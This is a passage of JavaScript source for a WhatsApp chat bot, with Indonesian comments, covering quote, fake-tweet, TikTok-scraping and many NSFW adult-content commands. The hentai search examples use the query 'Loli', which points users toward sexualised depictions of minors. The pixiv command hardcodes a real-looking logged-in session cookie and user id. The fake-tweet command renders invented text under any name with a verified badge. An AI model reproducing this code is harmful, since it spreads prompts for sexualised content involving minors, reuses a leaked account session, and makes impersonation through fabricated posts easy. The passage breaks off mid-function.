                    data.splice(2, 1);
                    if (data.length == 0) return resolve({ creator: '@neoxr - Wildan Izzudin & @ariffb.id - Ariffb', status: false });
                    resolve({ creator: '@neoxr - Wildan Izzudin & @ariffb.id - Ariffb', status: true, data });
                })
                .catch(reject);
        });
    }

    if (!text) return m.reply("Masukan Tipe Quotes\n\nContoh: .quotes senja");
    
    let ayam = await quotes(text);
    let jawir = ayam.data;
    let ngawi = pickRandom(jawir);
    const tweet = await new canvafy.Tweet()
        .setTheme("dim")
        .setUser ({ displayName: `${pushname}`, username: `tanakasensei` })
        .setVerified(true)
        .setComment(`${ngawi.quote}`)
        .setAvatar(ppnyauser)
        .build();
    
    let tanaka = tweet;
    lilychan.sendMessage(m.chat, { image: tanaka, caption: '' }, { quoted: m });
}
break

case 'renungan': {
    let merenung = await fetchJson('https://raw.githubusercontent.com/TanakaDomp/Database-Json/refs/heads/main/renungan.json');
    const randomImage = merenung[Math.floor(Math.random() * merenung.length)];
    lilychan.sendMessage(m.chat, { image: { url: randomImage }, caption: '' }, { quoted: m });
}
break

case 'tweet':
case 'faketweet': {
    if (!text) return m.reply(`Example: username | tagname | write`);
    
    let nama1 = text.split("|")[0];
    let tagname = text.split("|")[1];
    let katakata = text.split("|")[2];
    
    const tweet = await new canvafy.Tweet()
        .setTheme("dim")
        .setUser ({ displayName: nama1, username: tagname })
        .setVerified(true)
        .setComment(katakata)
        .setAvatar(ppnyauser )
        .build();
    
    let tanaka = tweet;
    lilychan.sendMessage(m.chat, { image: tanaka, caption: 'Done Desuu~' }, { quoted: m });
}
break

case 'pantun': {
    const jeson = await fetchJson('https://raw.githubusercontent.com/TanakaDomp/Database-Json/refs/heads/main/Pantun.json');
    let pantunnya = jeson[Math.floor(Math.random() * jeson.length)];
    
    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: pantunnya
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: ''
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: ``,
                        subtitle: "Tanaka Sense",
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{\"display_text\":\"Next\",\"id\":\"${prefix}pantun\"}`
                            }
                        ],
                    })
                })
            }
        }
    }, { quoted: m });

    await lilychan.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break

case 'longtext': {
    let tnksn = await fetchJson('https://raw.githubusercontent.com/Lanaxdev/hehehe/main/gaktau/longtext.json');
    let katanya = tnksn[Math.floor(Math.random() * tnksn.length)];
    let { proto, generateWAMessageFromContent } = require('@adiwajshing/baileys');
    
    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: katanya
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: ''
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: ``,
                        subtitle: "Tanaka Sense",
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_copy",
                                "buttonParamsJson": `{ "display_text": "Copy Text ⸙", "id": "123456789", "copy_code": "${katanya}" }`
                            },
                        ],
                    })
                })
            }
        }
    }, { quoted: m });

    await lilychan.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break
//<================================================>//
/*
 
 
                    [ SCRIPT LILY ]
    I share this script for free without spending any money, and I forbid anyone from selling this script. please report to Tanaka Senn if anyone is caught selling script Anya Forger 
                   < ASUPAN FITUR >

*/
//<================================================>//        
case 'asupan': {
    if (!isPremium) return m.reply(mess.prem);
    try {
        if (args[0] == '1') {
            lilychan.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
            const asupan = pickRandom([
                "cewek cantik",
                "msbreewc",
                "vicidior",
                "tokyolagii",
                "asupan indo",
                "tokyolagii edit",
                "kimi hime",
            ]);
            let { tiktoks } = require("./lib/ttdl");
            let tol = await tiktoks(`${asupan}`);
            await lilychan.sendMessage(m.chat, {
                video: { url: tol.no_watermark },
                gifPlayback: false,
                caption: 'Donee Desuu~'
            }, { quoted: m });
            lilychan.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        } else if (args[0] == '2') {
            lilychan.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
            const asupan = pickRandom([
                "cewek cantik",
                "msbreewc",
                "vicidior",
                "tokyolagii",
                "asupan indo",
                "tokyolagii edit",
                "kimi hime",
            ]);
            let { tiktoks } = require("./lib/ttdl");
            let tol = await tiktoks(`${asupan}`);
            let msg = await generateWAMessageContent({
                video: { url: tol.no_watermark }
            }, {
                upload: lilychan.waUploadToServer
            });
            let ptv = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({ ptvMessage: msg.videoMessage }), { userJid: m.chat, quoted: m });
            await lilychan.relayMessage(m.chat, ptv.message, { messageId: ptv.key.id });
        } else {
            m.reply(`Incorrect usage❌\n\nExample :\n${prefix + command} 1 <With Video>\n${prefix + command} 2 <With Ptv>\n\nAttention please do not use the feature in a spam manner`);
        }
    } catch (e) {
        console.log(e);
        m.reply('emlol');
    }
}
break

case 'douyinasupan':
case 'douyin':
case 'asupandouyin': {
    if (!isPremium) return m.reply(mess.prem);
    lilychan.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
    const tanakaganteng = pickRandom([
        "ulzzang",
        "ulzzang edit",
        "douyin",
        "douyin girl",
    ]);
    let { tiktoks } = require("./lib/ttdl");
    let tol = await tiktoks(`${tanakaganteng}`);
    await lilychan.sendMessage(m.chat, {
        video: { url: tol.no_watermark },
        gifPlayback: false,
        caption: 'Donee Desuu~'
    }, { quoted: m });
}
break

case 'ngawi': {
    let api = await fetchJson('https://widipe.com/asupandouyin/');
    m.reply(mess.wait);
    await lilychan.sendMessage(m.chat, {
        video: { url: api.url },
        gifPlayback: false,
        caption: 'Donee Desuu~'
    }, { quoted: m });
}
break

case 'ometv': {
    let omeh = await fetchJson('https://raw.githubusercontent.com/TanakaDomp/Database-Json/refs/heads/main/Ometv.json');
    let xxnxxxxxx = pickRandom(omeh);
    m.reply(mess.wait);
    await lilychan.sendMessage(m.chat, {
        video: { url: xxnxxxxxx },
        gifPlayback: false,
        caption: 'Donee Desuu~'
    }, { quoted: m });
}
break
  
  //NSFW FITUR
case 'hentai': {
    async function hentai() {
        return new Promise((resolve, reject) => {
            const page = Math.floor(Math.random() * 1153);
            axios.get('https://sfmcompile.club/page/' + page)
                .then((data) => {
                    const $ = cheerio.load(data.data);
                    const hasil = [];
                    $('#primary > div > div > ul > li > article').each(function (a, b) {
                        hasil.push({
                            title: $(b).find('header > h2').text(),
                            link: $(b).find('header > h2 > a').attr('href'),
                            category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
                            share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
                            views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
                            type: $(b).find('source').attr('type') || 'image/jpeg',
                            video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
                            video_2: $(b).find('video > a').attr('href') || ''
                        });
                    });
                    resolve(hasil);
                })
                .catch(reject);
        });
    }

    let data = await hentai();
    let src = pickRandom(data);
    let cap = `\`\`\`乂 RANDOM HENTAI\`\`\`
    
> *Judul:* ${src.title}
> *Category:* ${src.category}
> *Date:* ${src.date}

> *Link:* _${src.link}_
`.trim();
    
    await lilychan.sendFile(m.chat, src.video_1, null, cap, m);
}
break

case 'hentaitv': {
    async function HentaiTv(quwary) {
        return new Promise((resolve, reject) => {
            axios.get("https://hentai.tv/?s=" + quwary).then(async ({ data }) => {
                let $ = cheerio.load(data);
                let results = [];

                $('div.flex > div.crsl-slde').each(function (a, b) {
                    let _thumb = $(b).find('img').attr('src');
                    let _title = $(b).find('a').text().trim();
                    let _views = $(b).find('p').text().trim();
                    let _link = $(b).find('a').attr('href');
                    let hasil = { creator: 'sensei#404', thumbnail: _thumb, title: _title, views: _views, url: _link };
                    results.push(hasil);
                });
                resolve(results);
            }).catch(err => {
                console.log(err);
                reject(err);
            });
        });
    }

    if (!text) return m.reply(`Example : ${prefix + command} Loli`);
    let results = await HentaiTv(text);
    
    if (results.length > 0) {
        let message = `Hasil dari pencarian ${text} :\n\n`;
        results.forEach((result, index) => {
            message += `${index + 1}. *${result.title}*\n- Views : ${result.views}\n- Link : ${result.url}\n\n`;
        });
        m.reply(message);
    } else {
        m.reply('Tidak Ada Hasil.');
    }
}
break

case 'nekopoi': {
  const delay = (time) => new Promise((res) => setTimeout(res, time));
  
  class nekopoi {
  latest = () => {
    return new Promise(async (resolve, reject) => {
      const { data } = await axios.get("https://nekopoi.care", {
        headers: {
          "User-Agent": "Site24x7",
          "Cache-Control": "no-cache",
          Accept: "*/*",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip",
          "X-Site24x7-Id": "1420e1c1b70c",
          Host: "nekopoi.care",
        },
      });
      const $ = cheerio.load(data);
      const result = $("div#boxid > div.eropost")
        .map(function () {
          return {
            title: $(this).find("div.eroinfo > h2 > a").text().trim(),
            upload: $(this).find("div.eroinfo > span").eq(0).text().trim(),
            image: $(this).find("div.eroimg > div.limitero > img").attr("src"),
            link: $(this).find("div.eroinfo > h2 > a").attr("href"),
          };
        })
        .get();
      resolve(result);
    });
  };
  search = (query, page = 1) => {
    return new Promise(async (resolve, reject) => {
      query = encodeURIComponent(query);
      const { data } = await axios.get(
        `https://nekopoi.care/search/${query}/page/${page}`,
        {
          headers: {
            "User-Agent": "Site24x7",
            "Cache-Control": "no-cache",
            Accept: "*/*",
            Connection: "Keep-Alive",
            "Accept-Encoding": "gzip",
            "X-Site24x7-Id": "1420e1c1b70c",
            Host: "nekopoi.care",
          },
        },
      );
      const $ = cheerio.load(data);
      const result = $("div.result > ul > li")
        .map(function () {
          return {
            title: $(this).find("div.top > h2 > a").text().trim(),
            link: $(this).find("div.top > h2 > a").attr("href"),
            image: $(this).find("div.limitnjg > img").attr("src"),
            genre: $(this)
              .find("div.desc > p")
              .eq(3)
              .text()
              .replace("Genre :", "")
              .trim(),
            producers: $(this)
              .find("div.desc > p")
              .eq(5)
              .text()
              .replace("Producers :", "")
              .trim(),
            duration: $(this)
              .find("div.desc > p")
              .eq(6)
              .text()
              .replace("Duration :", "")
              .trim(),
            size: $(this)
              .find("div.desc > p")
              .eq(7)
              .text()
              .replace("Size :", "")
              .trim(),
          };
        })
        .get();
      resolve(result);
    });
  };
  detail = (url) => {
    return new Promise(async (resolve, reject) => {
      const { data } = await axios.get(url, {
        headers: {
          "User-Agent": "Site24x7",
          "Cache-Control": "no-cache",
          Accept: "*/*",
          Connection: "Keep-Alive",
          "Accept-Encoding": "gzip",
          "X-Site24x7-Id": "1420e1c1b70c",
          Host: "nekopoi.care",
        },
      });
      const $ = cheerio.load(data);
      const result = {};
      result.title = $("div.eropost > div.eroinfo > h1").text().trim();
      result.info = $("div.eropost > div.eroinfo > p").text().trim();
      result.img = $("div.contentpost > div.thm > img").attr("src");
      $(".konten p").each((index, element) => {
        const text = $(element).text();

        if (text.includes("Genre")) {
          result["genre"] = text.replace("Genre", "").replace(":", "").trim();
        } else if (text.includes("Sinopsis")) {
          result["sinopsis"] = $(element).next().text().replace(":", "").trim();
        } else if (text.includes("Anime")) {
          result["anime"] = text.replace("Anime", "").replace(":", "").trim();
        } else if (text.includes("Producers")) {
          result["producers"] = text
            .replace("Producers", "")
            .replace(":", "")
            .trim();
        } else if (text.includes("Duration")) {
          result["duration"] = text
            .replace("Duration", "")
            .replace(":", "")
            .trim();
        } else if (text.includes("Size")) {
          result["size"] = text.replace("Size", "").replace(":", "").trim();
        }
      });
      result.stream = $("div#stream1 > iframe").attr("src");
      result.download = $("div.arealinker > div.boxdownload > div.liner")
        .map(function () {
          const title = $(this).find("div.name").text().trim();
          const type = title.match(/\[(\d+p)\]/)[1];
          return {
            type: type,
            title: title,
            links: $(this)
              .find("div.listlink > p a")
              .map((_, el) => {
                return {
                  name: $(el).text().trim(),
                  link: $(el).attr("href"),
                };
              })
              .get(),
          };
        })
        .get();
      resolve(result);
    });
  };
}
  
  if (!text) {
    return m.reply(
      `Masukan Link Atau Title Nekopoi\n\nContoh :\n${prefix + command} Loli \n${prefix + command} https://nekopoi.care/`,
    );
  }
  if (/nekopoi.care/i.test(text)) {
    let resdetail = await nekopoi.detail(text)
    let { title, type, info, img, genre, producers, duration, size, stream, download } = resdetail;

    let downloadLinks = download.map((dl) => {
      let links = dl.links.map((link) => `\`${link.name}:\` ${link.link}`).join('\n');
      return `\`Type:\` ${dl.type}\n\`Title:\` ${dl.title}\n${links}`;
    }).join('\n\n');

    let caption = `
\`Title:\` ${title || 'Tidak ada'}
\`Info:\` ${info || 'Tidak ada'}
\`Genre:\` ${genre || 'Tidak ada'}
\`Producers:\` ${producers || 'Tidak ada'}
\`Duration:\` ${duration || 'Tidak ada'}
\`Size:\` ${size || 'Tidak ada'}
\`Stream:\` ${stream || 'Tidak ada'}

\`Download Links:\`\n${downloadLinks || 'Tidak ada'}
`.trim();
m.reply(caption)
  } else {
    let request;
    if (text.toLowerCase() === 'latest') {
      request = await nekopoi.latest()
    } else {
      request = await nekopoi.search(text);
    }

    let data = request;
    if (data?.error) return m.reply(`Query ${text} tidak ditemukan!`);

    let rows = [];
    for (let i = 0; i < data.length; i++) {
      let results = {
        alias: `${i + 1}`,
        response: prefix + "nekopoi " + data[i].link,
      };
      rows.push(results);
    }

    let description = rows.map((row) => `${row.alias}. ${data[row.alias - 1].title}\n> Link: ${data[row.alias - 1].link}`).join('\n\n');

    lilychan.sendMessage(m.chat, { text: `Silahkan pilih Hentai di bawah ini:\n\n${description}` });
  }
}
break

case 'pixnsfw': case 'pixivnsfw': {
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1] ? swn.split("|")[1] : 1
if (!pcknm) return m.reply(`Enter Query\n\nExample : ${prefix + command} blue_archive`)
try {
let url = "https://www.pixiv.net/touch/ajax/search/illusts";
        const header = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
            'Accept': "application/json",
            'Accept-Encoding': "gzip, deflate",
            'x-user-id': "94263110",
            'x-requested-with': "mark.via.gp",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'accept-language': "en-US,en;q=0.9",
            'Cookie': `first_visit_datetime=2024-04-03%2004%3A40%3A06; webp_available=1; cc1=2024-04-03%2004%3A40%3A06; __cf_bm=bFgcDe3ii0g4jGx2F3DaTDiqI45tTIjmVirfgKzgTA4-1712086806-1.0.1.1-PmaKCsuVW2_qPpzumrNho6ncdxvJbWvzelbYkqw0GT5cwcVnzPFr0qlfKc7hBR6M8RfL93yA8hcxjHuyGgOwCPtaXw.WiW7v1bE_EoD9qa8; p_ab_id=4; p_ab_id_2=4; p_ab_d_id=2029578662; __utma=235335808.2120078818.1712086808.1712086808.1712086808.1; __utmc=235335808; __utmz=235335808.1712086808.1.1.utmcsr=pixiv.com|utmccn=(referral)|utmcmd=referral|utmcct=/; __utmt=1; yuid_b=hCloOQA; _lr_geo_location_state=JB; _lr_geo_location=ID; _fbp=fb.1.1712086811148.1166980283; privacy_policy_agreement=6; _gid=GA1.2.910677620.1712086814; _ga_MZ1NL4PHH0=GS1.1.1712086816.1.0.1712086819.0.0.0; PHPSESSID=94263110_Fw0KsX7pznqpdYz3lK8R9yh9XYu50q0o; device_token=716919cff64a5320628cdf79ef4516b7; c_type=21; privacy_policy_notification=0; a_type=0; b_type=0; __utmv=235335808.|2=login%20ever=yes=1^3=plan=normal=1^6=user_id=94263110=1^9=p_ab_id=4=1^10=p_ab_id_2=4=1^11=lang=en=1^20=webp_available=yes=1; FCNEC=%5B%5B%22AKsRol-vCV9Hxuv0y5QgiXeC7T-BFYOrFVWJvquAW_a5dNJiomRpbw066zUVZyChY-7_loUKPrge1Xgfo4sIaFNaT5QLn_P22E2gS5ixUk2rUaobfhHC_pIaUYonV7bEpHq41Veo260DpW-4UuhCLkY4qTNun5Wopw%3D%3D%22%5D%5D; QSI_S_ZN_5hF4My7Ad6VNNAi=v:0:0; AMZN-Token=v2FweIBDV2dteXFXRmk0S2gzYlJ4WFFqZldkbTJrTkZ4WmVMTFNjMkV3RTRjNkdreWV1OGJscVpVQmhNcmVtVjlKamlISkIyK1QxcWV3a2gxM3lTZ0FWT3huQ21sWG0vTUlqRE9EbUg3bEErMmRJeWF5SXRySm16R2dYbVFpV1RPQ05vZGJrdgFiaXZ4HFNlKy92VWp2djcwMTc3KzlZeHQrNzcrOWRBQT3/; _pbjs_userid_consent_data=3524755945110770; _pubcid=4aecfda8-5100-45c7-9836-613f14880002; __gads=ID=a6eeb3b4c0a14363:T=1712086878:RT=1712086878:S=ALNI_MYl268T5t3l4KpQWHzo5sdDEn5fzQ; __eoi=ID=a5a1aef87f689702:T=1712086878:RT=1712086878:S=AA-AfjY3vOosEQzzth1nrPh5ZE5t; _im_vid=01HTG5941DFM57X0VR5XJ0HD20; cto_bundle=I5qpx19idyUyQnhKMHhYQnpLYjRqRWZQYXglMkZRYWNnY1V4WTdxOFpUTU5xd3c4c0p6M3FJRFYwZHVJSGIxNmFFc3ZoTWtmckNpTjJnb0lIUkRpajB1cWNMS3VocjNxWHdKZ3hKRWNuNzcyeGJKT3B2UkdKUHhLbGpCZGlycFF6UDhpWjBVOXlKRmpkODZZOSUyQmRSYTBuN2hXTk9QYkElM0QlM0Q; cto_bidid=hHBLll94dnBBd3pBRG0yJTJCT0dHNlJxMnB3SVUwMnY0UG1ESVRSeTdMQTVUT0xYQ29CaGdGdjFQdThVYVRqYnhrS3IzaWJzR2Vpb0FkWEowVzNxdlBUWXFydyUyQjlwbGhUaHlkUm5HaW9nOTNWJTJCUGc0ayUzRA; MgidStorage=%7B%220%22%3A%7B%22svspr%22%3A%22%22%2C%22svsds%22%3A1%7D%2C%22C1298385%22%3A%7B%22page%22%3A1%2C%22time%22%3A%221712086885038%22%7D%2C%22C1298391%22%3A%7B%22page%22%3A1%2C%22time%22%3A%221712086885023%22%7D%7D; __utmb=235335808.8.9.1712086837707; _ga_3WKBFJLFCP=GS1.1.1712086807.1.1.1712087230.0.0.0; _ga=GA1.1.2120078818.1712086808`
        };
        const params = {
            'include_meta': "1",
            's_mode': "s_tag",
            'type': "all",
            'word': pcknm,
            'csw': "0",
            'lang': "en",
            'version': "08a9c37ead5e5b84906f6cbcdb92429ae5d13ac8"
        };
         let cnt = 0;
    const chuy = await axios.get(url, { params: params, headers: header });
    let sifat = chuy.data.body.illusts; // Perhatikan di sini "let", bukan "const" agar bisa diubah
    
while (cnt < atnm) {

    if (sifat.length < 1) {
    await sendReaction("❌")
        return replygcmiyan('No Image Found.');
    }

    // Pilih indeks acak dan hapus elemen tersebut dari array
    const randomIndex = Math.floor(Math.random() * sifat.length);
    const sipat = sifat.splice(randomIndex, 1)[0]; // Menghapus elemen dari array dan mengambilnya
         
const imageUrl = sipat.url

let tumbas_wedhus = await axios.get(imageUrl, {
  headers: {
    referer: "https://pixiv.net"
  },
  responseType: 'arraybuffer'
})
const you = tumbas_wedhus.data

fs.writeFile(`${pcknm}.jpg`, you, (err) => {
  if (err) {
    console.error(err)
  } else {
   const img = fs.readFileSync(`${pcknm}.jpg`)
  lilychan.sendMessage(m.chat, { image: img, }, { quoted: m });
  fs.unlinkSync(`${pcknm}.jpg`);
          }
      });
          cnt++;
}
} catch (error) {
m.reply("emlol.")
}
}
break

case 'nhentai': {
    const PDFDocument = require('pdfkit');

    async function nhentaiScraper(id) {
        let response = await axios.get(`https://nhentai.net/g/${id}`);
        let match = response.data.match(/JSON\.parse\("(.*)"\);/);
        if (!match || !match[1]) throw new Error('Invalid response structure');
        return JSON.parse(match[1].replace(/\\u0022/g, '"')
            .replace(/\\u005C/g, '\\')
            .replace(/\\u002F/g, '/')
            .replace(/\\n/g, '')
            .replace(/\\t/g, '')
            .replace(/\\r/g, ''));
    }

    async function downloadImage(url) {
        try {
            const response = await axios({ url, responseType: 'arraybuffer' });
            return Buffer.from(response.data, 'binary');
        } catch (error) {
            console.error(`Error downloading image: ${error}`);
            throw error;
        }
    }

    async function toPDF(imageUrls, outputPath) {
        return new Promise(async (resolve, reject) => {
            const doc = new PDFDocument();
            const stream = fs.createWriteStream(outputPath);
            doc.pipe(stream);

            for (let i = 0; i < imageUrls.length; i++) {
                const imageUrl = imageUrls[i];
                const imageBuffer = await downloadImage(imageUrl);
                if (i > 0) {
                    doc.addPage();
                }
                doc.image(imageBuffer, {
                    fit: [doc.page.width, doc.page.height],
                    align: 'center',
                    valign: 'center',
                });
            }

            doc.end();
            stream.on('finish', resolve);
            stream.on('error', reject);
        });
    }

    let code = (args[0] || '').replace(/\D/g, '');
    if (!code) return m.reply('Input code');
    await m.reply('_In progress, please wait..._');

    let data = await nhentaiScraper(code);
    let pages = data.images.pages.map((v, i) => `https://t7.nhentai.net/galleries/${data.media_id}/${i + 1}.jpg`);
    let svtemp = `./tmp/${data.title.english}.pdf`;

    await toPDF(pages, svtemp);
    await m.reply(`Berhasil Membuat ${data.title.english}`);

    await lilychan.sendMessage(m.chat, {
        document: fs.readFileSync(svtemp),
        caption: "Pembokep",
        fileName: `${data.title.english}.pdf`,
        mimetype: 'application/pdf',
    }, { quoted: m });
    await fs.unlinkSync(svtemp);
}
break

case 'rule34': {
    if (!isPremium) return m.reply(mess.prem);

    async function rule34Random() {
        try {
            let response = await axios.get('https://api.rule34.xxx/index.php?page=dapi&s=post&q=index&json=1');
            let results = response.data;

            if (!Array.isArray(results) || results.length === 0) {
                throw new Error('No images found');
            }

            let randomImage = results[Math.floor(Math.random() * results.length)];
            let imageUrl = randomImage.file_url;

            if (!imageUrl) {
                throw new Error('Image URL not found');
            }

            return { status: 200, imageUrl };
        } catch (error) {
            console.error('Error:', error);
            return { status: 500, error: error.message };
        }
    }

    async function sendRandomRule34Image(m) {
        try {
            let response = await rule34Random();
            if (response.status !== 200) {
                throw new Error(response.error);
            }

            let imageUrl = response.imageUrl;
            lilychan.sendMessage(m.chat, {
                image: { url: imageUrl },
                caption: '```Success...\nDont forget to donate```'
            }, { quoted: m });
        } catch (e) {
            lilychan.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
        }
    }

    sendRandomRule34Image(m);
}
break

  case 'gay':
    case 'ahegao':
    case 'ass':
    case 'bdsm':
    case 'blowjob':
    case 'cuckold':
    case 'cum':
    case 'ero':
    case 'femdom':
    case 'foot':
    case 'gangbang':
    case 'glasses':
    case 'hentai':
    case 'gifs':
    case 'jahy':
    case 'manga':
    case 'masturbation':
    case 'neko2':
    case 'orgy':
    case 'panties':
    case 'pussy':
    case 'tentacles':
    case 'yuri':
    case 'thighs':
    case 'zettai':
    {
    if (!isPremium) return m.reply(mess.prem)
        try {
            if (command == 'gay') {
                const res = await getBuffer(`https://api.betabotz.eu.org/api/nsfw/gay?apikey=${btz}`);
                await lilychan.sendMessage(m.chat, {
                    image: res
                    
                }, {
                    quoted: m
                });

            }
            if (command == 'ahegao') {
                const res = await getBuffer(`https://api.betabotz.eu.org/api/nsfw/ahegao?apikey=${btz}`);
                await lilychan.sendMessage(m.chat, {
                    image: res
                }, {
                    quoted: m
                });

            }
            if (command == 'ass') {
                const res = await getBuffer(`https://api.betabotz.eu.org/api/nsfw/ass?apikey=${btz}`);
                await lilychan.sendMessage(m.chat, {
                    image: res
                }, {
                    quoted: m
                });

            }
            if (command == 'bdsm') {
                const res = await getBuffer(`https://api.betabotz.eu.org/api/nsfw/bdsm?apikey=${btz}`);
                await lilychan.sendMessage(m.chat, {
                    image: res
                }, {
                    quoted: m
                });

            }
            if (command == 'blowjob') {
                const res = await getBuffer(`https://api.betabotz.eu.org/api/nsfw/blowjob?apikey=${btz}`);
                await lilychan.sendMessage(m.chat, {
                    image: res
                }, {
                    quoted: m
                });

            }
            if (command == 'cuckold') {
                const res = await getBuffer(`https://api.betabotz.eu.org/api/nsfw/cuckold?apikey=ct${btz}`);
                await lilychan.sendMessage(m.chat, {
                    image: res
                }, {
                    quoted: m
                });

            }
            if (command == 'cum') {
                const res = await getBuffer(`https://api.betabotz.eu.org/api/nsfw/cum?apikey=${btz}`);
                await lilychan.sendMessage(m.chat, {
                    image: res
                }, {
                    quoted: m
                });

            }
            if (command == 'ero') {
                const res = await getBuffer(`https://api.betabotz.eu.org/api/nsfw/ero?apikey=${btz}`);
                await lilychan.sendMessage(m.chat, {
                    image: res
                }, {
                    quoted: m
                });

            }
            if (command == 'femdom') {
                const res = await getBuffer(`https://api.betabotz.eu.org/api/nsfw/femdom?apikey=${btz}`);
                await lilychan.sendMessage(m.chat, {
                    image: res
                }, {
                    quoted: m
                });

            }
            if (command == 'foot') {
                const res = await getBuffer(`https://api.betabotz.eu.org/api/nsfw/foot?apikey=${btz}`);
                await lilychan.sendMessage(m.chat, {
                    image: res
                }, {
                    quoted: m
                });

            }
            if (command == 'gangbang') {
                const res = await getBuffer(`https://api.betabotz.eu.org/api/nsfw/gangbang?apikey=${btz}`);
                await lilychan.sendMessage(m.chat, {
                    image: res
                }, {
                    quoted: m
                });

            }
            if (command == 'glasses') {
                const res = await getBuffer(`https://api.betabotz.eu.org/api/nsfw/glasses?apikey=${btz}`);
                await lilychan.sendMessage(m.chat, {
                    image: res
                }, {
                    quoted: m
                });

            }
            if (command == 'gifs') {
                const res = await getBuffer(`https://api.betabotz.eu.org/api/nsfw/gifs?apikey=${btz}`);
                await lilychan.sendFile(m.chat, res, 'nsfw.jpg', '', m);

            }
            if (command == 'jahy') {
                const res = await getBuffer(`https://api.betabotz.eu.org/api/nsfw/jahy?apikey=${btz}`);
                await lilychan.sendMessage(m.chat, {
                    image: res
                }, {
                    quoted: m
                });

            }
            if (command == 'manga') {
                const res = await getBuffer(`https://api.betabotz.eu.org/api/nsfw/manga?apikey=${btz}`);
                await lilychan.sendMessage(m.chat, {
                    image: res
                }, {
                    quoted: m
                });

            }
            if (command == 'masturbation') {
                const res = await getBuffer(`https://api.betabotz.eu.org/api/nsfw/masturbation?apikey=${btz}`);
                await lilychan.sendMessage(m.chat, {
                    image: res
                }, {
                    quoted: m
                });

            }
            if (command == 'neko2') {
                const res = await getBuffer(`https://api.betabotz.eu.org/api/nsfw/neko2?apikey=${btz}`);
                await lilychan.sendMessage(m.chat, {
                    image: res
                }, {
                    quoted: m
                });

            }
            if (command == 'orgy') {
                const res = await getBuffer(`https://api.betabotz.eu.org/api/nsfw/orgy?apikey=${btz}`);
                await lilychan.sendMessage(m.chat, {
                    image: res
                }, {
                    quoted: m
                });

            }
            if (command == 'panties') {
                const res = await getBuffer(`https://api.betabotz.eu.org/api/nsfw/panties?apikey=${btz}`);
                await lilychan.sendMessage(m.chat, {
                    image: res
                }, {
                    quoted: m
                });

            }
            if (command == 'pussy') {
                const res = await getBuffer(`https://api.betabotz.eu.org/api/nsfw/pussy?apikey=${btz}`);
                await lilychan.sendMessage(m.chat, {
                    image: res
                }, {
                    quoted: m
                });

            }
            if (command == 'tentacles') {
                const res = await getBuffer(`https://api.betabotz.eu.org/api/nsfw/tentacles?apikey=${btz}`);
                await lilychan.sendMessage(m.chat, {
                    image: res
                }, {
                    quoted: m
                });

            }
            if (command == 'yuri') {
                const res = await getBuffer(`https://api.betabotz.eu.org/api/nsfw/yuri?apikey=${btz}`);
                await lilychan.sendMessage(m.chat, {
                    image: res
                }, {
                    quoted: m
                });

            }
            if (command == 'thighs') {
                const res = await getBuffer(`https://api.betabotz.eu.org/api/nsfw/thighs?apikey=${btz}`);
                await lilychan.sendMessage(m.chat, {
                    image: res
                }, {
                    quoted: m
                });

            }
            if (command == 'zettai') {
                const res = await getBuffer(`https://api.betabotz.eu.org/api/nsfw/zettai?apikey=${btz}`);
                await lilychan.sendMessage(m.chat, {
                    image: res
                }, {
                    quoted: m
                });

            }
        } catch (err) {
            console.error(err)
            m.reply("🚩 Terjadi kesalahan");
        }
    }
    break 
         
//<================================================>//
/*
 
 
                    [ SCRIPT LILY ]
    I share this script for free without spending any money, and I forbid anyone from selling this script. please report to Tanaka Senn if anyone is caught selling script Lilychanj 
                   < MAIN FITUR >

*/
//<================================================>//
case 'botstatus':
case 'statusbot':
case 'ping': {
const start = performance.now();
const cpus = os.cpus();
const uptimeSeconds = os.uptime();
const uptimeDays = Math.floor(uptimeSeconds / 86400);
const uptimeHours = Math.floor((uptimeSeconds % 86400) / 3600);
const uptimeMinutes = Math.floor((uptimeSeconds % 3600) / 60);
const uptimeSecs = Math.floor(uptimeSeconds % 60);
const totalMem = os.totalmem();
const freeMem = os.freemem();
const usedMem = totalMem - freeMem;
const muptime = runtime(process.uptime()).trim()
const formattedUsedMem = formatSize(usedMem);
const formattedTotalMem = formatSize(totalMem);
const loadAverage = os.loadavg().map(avg => avg.toFixed(2)).join(", ");
const speed = (performance.now() - start).toFixed(3);

    let respon = `Server Information:\n
- CPU Cores: ${cpus.length}
- CPU Model: ${cpus[0].model}
- Platform: ${os.platform()}
- Architecture: ${os.arch()}
